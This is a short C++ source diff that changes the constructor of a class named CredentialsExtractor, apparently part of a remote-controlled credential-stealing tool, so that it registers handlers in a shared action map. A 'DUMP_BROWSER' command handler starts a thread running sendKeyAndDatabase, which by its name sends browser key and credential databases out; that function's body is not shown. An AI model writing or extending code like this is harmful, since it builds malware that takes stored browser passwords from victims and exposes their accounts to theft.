@@ -1,6 +1,7 @@
 #include "CredentialsExtractor.h"
 
-CredentialsExtractor::CredentialsExtractor(const Stream &stream) : Sender(stream) {
+CredentialsExtractor::CredentialsExtractor(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap)
+        : Sender(stream, actionMap) {
     actionMap["DUMP_BROWSER"] = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &CredentialsExtractor::sendKeyAndDatabase);
     };
